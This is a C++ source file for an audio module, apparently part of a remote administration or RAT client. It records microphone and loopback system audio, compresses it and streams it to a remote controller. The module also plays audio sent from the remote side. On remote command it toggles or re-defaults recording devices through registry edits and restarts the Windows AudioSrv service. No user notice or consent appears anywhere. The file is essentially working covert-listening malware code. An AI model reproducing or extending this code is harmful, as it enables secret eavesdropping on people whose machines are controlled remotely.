// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "AudioManager.h"
#include <stdio.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	m_bIsWorking = false;
	m_lpAudio = NULL;
	
	if (!Initialize()) // 初始化
		return;
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	m_hCoreThread = NULL;
}

CAudioManager::~CAudioManager()
{
	StopListen();
}

void CAudioManager::StopListen()
{
	m_bIsWorking = false;

	if (m_hWorkThread)
	{
		WaitForSingleObject(m_hWorkThread, INFINITE);
 		CloseHandle(m_hWorkThread);
    	m_hWorkThread = NULL;
	}

	if (m_hCoreThread)
	{
		WaitForSingleObject(m_hCoreThread, INFINITE);
		CloseHandle(m_hCoreThread);
    	m_hCoreThread = NULL;
	}
	
	if (m_lpAudio)
	{
 		delete	m_lpAudio;
		m_lpAudio = NULL;
	}
}

BOOL bIsOsXPS()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	if(OsVerInfoEx.dwMajorVersion < 6)
		return TRUE;
	else 
		return FALSE;
}

bool CAudioManager::Initialize()
{
	// 正在使用中.. 防止重复使用
	if (m_bIsWorking)
	{
		return false;
	}

	WAVE_INFO Wave_Info;
	ZeroMemory(&Wave_Info,sizeof(WAVE_INFO));

	UINT nDevNum  = waveInGetNumDevs();
	if (0 == nDevNum)
	{
		if(!bIsOsXPS() && waveOutGetNumDevs())
		{
			SendToken(&Wave_Info,TOKEN_AUDIO_START);
			return true;
		}
		return false;
	}

	m_lpAudio = new CAudio;
	if(m_lpAudio == NULL)
	{
		return false;
	}

	for(int i = 0; i < nDevNum ; i++)
	{
		WAVEINCAPS tagCaps;
		waveInGetDevCapsA(i,&tagCaps,sizeof(tagCaps));
		lstrcat(Wave_Info.str,tagCaps.szPname);
		lstrcat(Wave_Info.str,"$");
		
		if (i == 0)
		{
			// 根据 输入设备名-枚举输入线路 | 参数 设备名 字符串
			int nRet = m_lpAudio->EnumerateInputLines(tagCaps.szPname,Wave_Info.str);
			if (nRet == -1)
			{
				Wave_Info.nIndex = 0;
				lstrcat(Wave_Info.str,"N/A@");
			}
			else
			{
				Wave_Info.nIndex = nRet;
			}
			lstrcat(Wave_Info.str,"|");
		}
	}

	SendToken(&Wave_Info,TOKEN_AUDIO_START);

	return true;
}

BOOL CAudioManager::SendToken(WAVE_INFO * Wave_Info , BYTE bToken)
{
	const UINT dwBytesLength = 1 + sizeof(WAVE_INFO);
	BYTE lpBuffer[dwBytesLength] = {0};
	
	lpBuffer[0] = bToken;
	
	memcpy(lpBuffer + 1,Wave_Info,sizeof(WAVE_INFO));
	Send(lpBuffer, dwBytesLength);
	
	return TRUE;
}

int CAudioManager::SendRecordBuffer()
{
	DWORD	dwBytes = 0;
	int	nSendBytes = 0;
	
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;

	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	lpPacket[0] = TOKEN_AUDIO_DATA;

	if (dwBytes > 0)
	{
		int lin  = m_lpAudio->Compress((char*)lpBuffer,m_cBufln,dwBytes);
		memcpy(lpPacket + 1, m_cBufln, lin);

		nSendBytes = Send(lpPacket, lin + 1);
	}

	delete [] lpPacket;
	
	return nSendBytes;
}

#include <time.h>
char * my_strstr(const char * str1,const char * str2)
{
	char *cp = (char *) str1;
	char *s1, *s2;
	if ( !*str2 )
		return((char *)str1);
	while (*cp)
	{
		s1 = cp;
		s2 = (char *) str2;

		while ( *s1 && *s2 && !(*s1-*s2) )
			s1++, s2++;
		if (!*s2)
			return(cp);
		cp++;
	}
	return(NULL);
}

static void DateToBytes(BYTE *bytes)
{
	SYSTEMTIME date;
	::GetLocalTime(&date);
	bytes[1] = (BYTE)(date.wYear / 0x100);
	bytes[0] = (BYTE)(date.wYear - bytes[1] * 0x100);
	bytes[2] = (BYTE)date.wMonth;
	bytes[3] = 0; bytes[5] = 0; bytes[7] = 0; bytes[9] = 0; bytes[11] = 0; bytes[13] = 0;
	bytes[15] = 0;
	bytes[4] = (BYTE)date.wDayOfWeek;
	bytes[6] = (BYTE)date.wDay;
	bytes[8] = (BYTE)date.wHour;
	bytes[10] = (BYTE)date.wMinute;
	bytes[12] = (BYTE)date.wSecond;
	bytes[14] = (BYTE)date.wMilliseconds;
}

BOOL IsWow64() 
{ 
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 
	
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); 
	LPFN_ISWOW64PROCESS fnIsWow64Process; 
	BOOL bIsWow64 = FALSE; 
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( kernel32,"IsWow64Process"); 
	
	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 
	
	if (NULL != fnIsWow64Process) 
	{ 
		fnIsWow64Process(myGetCurrentProcess(),&bIsWow64);
	}
	
	if(kernel32)
		FreeLibrary(kernel32);
	return bIsWow64; 
}

typedef struct tagMMAudioDev
{
	DWORD nState;
	char szID[100];
	char szDeviceName[100];
}MMAudioDev;


BOOL MyControlService()  //启动 停止服务
{
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;

	scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);  // 打开服务管理对象

	service=OpenService(scm,"AudioSrv",SERVICE_ALL_ACCESS);  // 打开www服务

	BOOL isSuccess=QueryServiceStatus(service,&status);

	isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);

	Sleep(1000);
	isSuccess=StartService(service,NULL,NULL);

	CloseServiceHandle(service );
	CloseServiceHandle(scm);

	// 稍稍Sleep下，防止出错

	return isSuccess;
}

 
// 0 枚举 1 设置默认 2 启用 3 禁用
int EnumRecordDevice(UINT nType,LPBYTE lpBuffer = NULL)
{
	const int BUFF_LEN = 260;
	
	HKEY hkCaptureDevices;
	DWORD dwKey = KEY_WOW64_64KEY;
	if (!IsWow64())
		dwKey = KEY_WOW64_32KEY;

	int nCount = 0;
	
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\MMDevices\\Audio\\Capture" , 0, KEY_ENUMERATE_SUB_KEYS | dwKey, &hkCaptureDevices);
	TCHAR lpwstrDeviceGuidKey[BUFF_LEN];
	DWORD dwDeviceGuidKeySize = BUFF_LEN;
	for(int i=0;RegEnumKeyEx(hkCaptureDevices, i, lpwstrDeviceGuidKey, &dwDeviceGuidKeySize, 0, 0, 0, 0) != ERROR_NO_MORE_ITEMS; ++i){
		dwDeviceGuidKeySize = BUFF_LEN;
		HKEY hkProps;
		char str[MAX_PATH] = {0};
		lstrcpy(str,lpwstrDeviceGuidKey);
		lstrcat(str,"\\Properties");
		RegOpenKeyEx(hkCaptureDevices, str, 0, KEY_READ | dwKey, &hkProps);
		TCHAR data[BUFF_LEN];
		DWORD dwDataSize = BUFF_LEN;
		if(RegQueryValueEx(hkProps, "{a45c254e-df1c-4efd-8020-67d146a850e0},2", 0, 0, (LPBYTE)data, &dwDataSize) !=  ERROR_SUCCESS){
			continue;
		}else 
		{
			char strCurrentDeviceName[MAX_PATH] ={0};
			lstrcpy(strCurrentDeviceName,data);
			HKEY hkGuid;
			RegOpenKeyEx(hkCaptureDevices, lpwstrDeviceGuidKey , 0, KEY_READ | KEY_SET_VALUE | KEY_QUERY_VALUE | KEY_NOTIFY  | dwKey  , &hkGuid);
			

			if (nType == 0)
			{
				DWORD lpType = REG_DWORD;
/*
				if(RegQueryValueEx(hkGuid, "Role:0", 0, &lpType, NULL,NULL) !=  ERROR_SUCCESS)
				{
					continue;
				}*/
				
				DWORD dwValue;
				DWORD dwSize = sizeof(DWORD);
				if(RegQueryValueEx(hkGuid, "DeviceState", 0, &lpType, (LPBYTE)&dwValue,&dwSize) !=  ERROR_SUCCESS)
				{
					continue;
				}
				

				if (dwValue != 1 && dwValue != 4 && dwValue != 268435457)
				{
					continue;
				}

				MMAudioDev dev;
				memset(&dev,0,sizeof(MMAudioDev));
				
				dev.nState = dwValue;
 	     		lstrcpy(dev.szDeviceName,strCurrentDeviceName);
				lstrcpy(dev.szID,lpwstrDeviceGuidKey);

				memcpy(lpBuffer+nCount*sizeof(MMAudioDev),&dev,sizeof(MMAudioDev));

				nCount ++;

						
			/*
			if (dwValue == 1)
			{
			AfxMessageBox("活跃");
			}
			else if (dwValue == 4)
			{
			AfxMessageBox("未插入");
			}else if (dwValue == 268435457 )
			{
			AfxMessageBox("禁用");
			}else
			AfxMessageBox("未知");
			
			  
			AfxMessageBox(strCurrentDeviceName);*/

			}else
			{
				if(my_strstr((char*)lpBuffer,lpwstrDeviceGuidKey) == NULL)
					continue;
				if (nType == COMMAND_AUDIO_SET_DEFAULT_DEVICE)
				{
					BYTE b[16];
					DateToBytes(b);

					//				RegSetValueExA(hkGuid, ("DeviceState"), 0, REG_DWORD, (LPBYTE)&dwV, sizeof(DWORD));

					RegSetValueExA(hkGuid, ("Role:0"), 0, REG_BINARY, b, 16);
					RegSetValueExA(hkGuid, ("Role:1"), 0, REG_BINARY, b, 16);
					RegSetValueExA(hkGuid, ("Role:2"), 0, REG_BINARY, b, 16);
					RegFlushKey(hkGuid);
					RegCloseKey(hkGuid);
					break;
				}else 
				if (nType == COMMAND_AUDIO_ENABLED_DEVICE)
				{
					DWORD dwValue = 1;
					RegSetValueExA(hkGuid, ("DeviceState"), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
					break;

				}else 
				if (nType == COMMAND_AUDIO_DISABLE_DEVICE)
				{
					DWORD dwValue = 268435457;
					RegSetValueExA(hkGuid, ("DeviceState"), 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
					break;
				}	
			}

		}
		RegCloseKey(hkProps);
	}
	RegCloseKey(hkCaptureDevices);

	return nCount;
}

void CAudioManager::OnReceive( LPBYTE lpBuffer, UINT  nSize )
{
	switch(lpBuffer[0])
	{
	case COMMAND_NEXT://打开对话框了
		NotifyDialogIsOpen();
		break;
	case COMMAND_AUDIO_SET_DEFAULT_DEVICE:
	case COMMAND_AUDIO_ENABLED_DEVICE:
	case COMMAND_AUDIO_DISABLE_DEVICE:
		{
			StopListen();

			EnumRecordDevice(lpBuffer[0],lpBuffer + 1);
			MyControlService();
		}
		break;
	case COMMAND_AUDIO_ENUM_RECORD_DEVICE:
		{
			if (bIsOsXPS())
				return;
			LPBYTE lpData = new BYTE[sizeof(MMAudioDev)*20 + 2];
			if (lpData == NULL)
			{
				return;
			}
			memset(lpData,0,sizeof(MMAudioDev)*20 + 2);
			lpData[0] = TOKEN_AUDIO_SHOW_DEVICE;
			lpData[1] = EnumRecordDevice(0,lpData + 2);
			if (lpData[1])
				m_pClient->Send(lpData,2+ sizeof(MMAudioDev)* lpData[1]);

			delete [] lpData;

		}
		break;
	case COMMAND_AUDIO_CHANGER_WAVETAG:
		{
			StopListen();

			m_lpAudio = new CAudio;
			if (m_lpAudio == NULL)
				return;

		   memcpy(&m_lpAudio->waveform,lpBuffer+1,sizeof(m_lpAudio->waveform));
 
		   m_hWorkThread = MyCreateThread(NULL,
			   0, 
			   (LPTHREAD_START_ROUTINE)WorkThread, 
			   (LPVOID)this,
			   0, 
			   NULL
			   );
		}
		break;
	case COMMAND_AUDIO_COREAUDIOAPIS:// WIN7 下声卡抓取
		{
			if (bIsOsXPS())
				return;
			StopListen();

			m_lpAudio = new CAudio;
			if (m_lpAudio == NULL)
				return;
			m_hCoreThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CoreThread, (LPVOID)this, 0, NULL);
		}
		break;
	case COMMAND_AUDIO_CHANGER:// 更换录音设备
	 	{
	        WAVEFORMATEX waveform; //采集音频的格式，结构体
	        memcpy(&waveform,&m_lpAudio->waveform,sizeof(m_lpAudio->waveform));

			StopListen();

			m_lpAudio = new CAudio;
			if (m_lpAudio == NULL)
				return;

			memcpy(&m_lpAudio->waveform,&waveform,sizeof(m_lpAudio->waveform));

			WAVE_INFO Wave_Info;
			memcpy(&Wave_Info, lpBuffer +1 , sizeof(WAVE_INFO));

			m_lpAudio->m_SelectedDevice = Wave_Info.nIndex;

			char str[MAX_PATH] = {0};
			lstrcpy(str,Wave_Info.str);

			ZeroMemory(&Wave_Info,sizeof(WAVE_INFO));

			int nRet = Wave_Info.nIndex = m_lpAudio->EnumerateInputLines(str,Wave_Info.str);
			if (nRet == -1)
			{
				Wave_Info.nIndex = 0;
				lstrcpy(Wave_Info.str,"N/A@");
			}
			else
				Wave_Info.nIndex = nRet;

			SendToken(&Wave_Info,TOKEN_AUDIO_CHANGE_FINISH);

			m_hWorkThread = MyCreateThread(NULL,
				0, 
				(LPTHREAD_START_ROUTINE)WorkThread, 
				(LPVOID)this,
				0, 
				NULL
				);

		}
		break;
	case COMMAND_AUDIO_DATE: //播放远程数据
		{
			memset(m_cBufOut,0,SIZE_AUDIO_FRAME);
			int lOut = m_lpAudio->DeCompress((char *)lpBuffer + 1,m_cBufOut,nSize - 1);
			m_lpAudio->playBuffer((LPBYTE)m_cBufOut, lOut);
		}
		break;
	case COMMAND_AUDIO_CHANGER_LINES: //　更改输入线路　仅ＸＰ
		{
			WAVE_INFO Wave_Info;
			memcpy(&Wave_Info, lpBuffer +1 , sizeof(WAVE_INFO));
			m_lpAudio->ActiveMixerInputChannel(Wave_Info.str,Wave_Info.nIndex);

		}
		break;
	default:
		return;

	}
}

DWORD WINAPI CAudioManager::WorkThread( LPVOID lparam )
{
	CAudioManager *pThis = (CAudioManager *)lparam;

	pThis->m_bIsWorking = true;
	// 等待远程对话框打开,init
	pThis->WaitForDialogOpen();

	while (pThis->m_bIsWorking)
		pThis->SendRecordBuffer();

	return -1;
}

////////////////////////////////////////////////////////////////////////// 下面是Core Audio Apis 的声卡抓取

#include <mmdeviceapi.h>
#include <assert.h>
#include <Audioclient.h>
#include <avrt.h>
#include <process.h>


BOOL SetFormat(WAVEFORMATEX *pwfx)
{
	BOOL bRet(FALSE);

	if (pwfx->wFormatTag == WAVE_FORMAT_IEEE_FLOAT)
	{
		pwfx->wFormatTag = WAVE_FORMAT_PCM;
		pwfx->wBitsPerSample = 8;
		pwfx->nBlockAlign = pwfx->nChannels * pwfx->wBitsPerSample / 8;
		pwfx->nAvgBytesPerSec = pwfx->nBlockAlign * pwfx->nSamplesPerSec;

		bRet = TRUE;
	}
	else if (pwfx->wFormatTag == WAVE_FORMAT_EXTENSIBLE)
	{
		PWAVEFORMATEXTENSIBLE pEx = reinterpret_cast<PWAVEFORMATEXTENSIBLE>(pwfx);
		if (IsEqualGUID(KSDATAFORMAT_SUBTYPE_IEEE_FLOAT, pEx->SubFormat))
		{
			pEx->SubFormat = KSDATAFORMAT_SUBTYPE_PCM;
			pEx->Samples.wValidBitsPerSample = 8;//原来是16

			pwfx->wBitsPerSample = 8;//原来是16 
			pwfx->nBlockAlign = pwfx->nChannels * pwfx->wBitsPerSample / 8;
			pwfx->nAvgBytesPerSec = pwfx->nBlockAlign * pwfx->nSamplesPerSec;

			bRet = TRUE;
		}
	}

	return bRet;
}

UINT nMaxBuffer = 0;

DWORD WINAPI CAudioManager::SendBuffer(LPVOID lparam)
{
	CAudioManager *pThis = (CAudioManager *)lparam;

	LPBYTE lpBuffer = new BYTE[pThis->nMaxBuffer + 1];
	if (lpBuffer == NULL)
	{
		return -1;
	}
	lpBuffer[0] = TOKEN_AUDIO_COREDATA;

	while(pThis->m_bIsWorking)
	{
		if (pThis->m_Buffer.GetBufferLen() >= pThis->nMaxBuffer)
		{
			pThis->m_Buffer.Read(lpBuffer +1, pThis->nMaxBuffer);

			pThis->Send((LPBYTE)lpBuffer,pThis->nMaxBuffer +1 );

		}
		Sleep(10);
	}

	if (lpBuffer)
	{
		delete []lpBuffer;
	}
	return -1;
}

#define REFTIMES_PER_MILLISEC  10000
#define REFTIMES_PER_SEC  10000000
#define EXIT_ON_ERROR(hres)  \
	if (FAILED(hres)) { goto Exit; }
#define SAFE_RELEASE(punk)  \
	if ((punk) != NULL)  \
{ (punk)->Release(); (punk) = NULL; }

DWORD WINAPI CAudioManager::CoreThread( LPVOID lparam )
{
	CAudioManager *pThis = (CAudioManager *)lparam;
	
	if(FAILED(CoInitialize(NULL))) /*, COINIT_APARTMENTTHREADED)))*/
		return -1;

	pThis->m_bIsWorking = true;
	pThis->m_Buffer.ClearBuffer();


	HRESULT hr = 0;
	WAVEFORMATEX *pwfx = NULL;
	UINT32 nNextPacketSize = 0;
	UINT32 nNumFramesToRead;
	UINT32 bufferFrameCount;
	IMMDevice* pDevice = NULL;
	IMMDeviceEnumerator *pMMDeviceEnumerator = NULL;
	IAudioClient *pAudioClient = NULL;
	IAudioCaptureClient *pAudioCaptureClient = NULL;
	REFERENCE_TIME hnsActualDuration;
	REFERENCE_TIME hnsDefaultDevicePeriod = 0;
	HANDLE m_hSendThread = NULL;
	BYTE *pData = NULL;
	DWORD dwFlags;

	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pMMDeviceEnumerator);
	EXIT_ON_ERROR(hr)

	hr = pMMDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
	pMMDeviceEnumerator->Release();

	hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
    EXIT_ON_ERROR(hr)

	hr = pAudioClient->GetDevicePeriod(&hnsDefaultDevicePeriod, NULL);
    EXIT_ON_ERROR(hr)

	hr = pAudioClient->GetMixFormat(&pwfx);
    EXIT_ON_ERROR(hr)

	if (!SetFormat(pwfx))
		EXIT_ON_ERROR(S_FALSE)

	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, 0, 0, pwfx, 0);
    EXIT_ON_ERROR(hr)

	hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pAudioCaptureClient);
    EXIT_ON_ERROR(hr)

	pThis->nMaxBuffer = pwfx->nAvgBytesPerSec;
	m_hSendThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendBuffer, (LPVOID)pThis, 0, NULL);

	hr = pAudioClient->GetBufferSize(&bufferFrameCount);
    EXIT_ON_ERROR(hr)

	hnsActualDuration = (double)REFTIMES_PER_SEC *	bufferFrameCount / pwfx->nSamplesPerSec;

   	hr = pAudioClient->Start();
	EXIT_ON_ERROR(hr)

	while (pThis->m_bIsWorking)
	{
		//让程序暂停运行一段时间，缓冲区里在这段时间会被填充数据
		Sleep(hnsActualDuration/REFTIMES_PER_MILLISEC/2);

		hr = pAudioCaptureClient->GetNextPacketSize(&nNextPacketSize);
        EXIT_ON_ERROR(hr)

		if (nNextPacketSize == 0)
			continue;

		hr = pAudioCaptureClient->GetBuffer(&pData, &nNumFramesToRead, &dwFlags, NULL, NULL);
		if (dwFlags & AUDCLNT_BUFFERFLAGS_SILENT)
		{
			continue;
		}

		if (0 != nNumFramesToRead)
		{
			int bcnt = nNumFramesToRead * pwfx->nBlockAlign;
		    pThis->m_Buffer.Write(pData, bcnt);
		}
		pAudioCaptureClient->ReleaseBuffer(nNumFramesToRead);
	}

	hr = pAudioClient->Stop();  // Stop recording.
	EXIT_ON_ERROR(hr)
Exit:
	WaitForSingleObject(m_hSendThread, INFINITE);
	CloseHandle(m_hSendThread);

	CoTaskMemFree(pwfx);
	SAFE_RELEASE(pAudioCaptureClient)
	SAFE_RELEASE(pDevice)
	SAFE_RELEASE(pAudioClient)

	CoUninitialize();

	return -1;
}
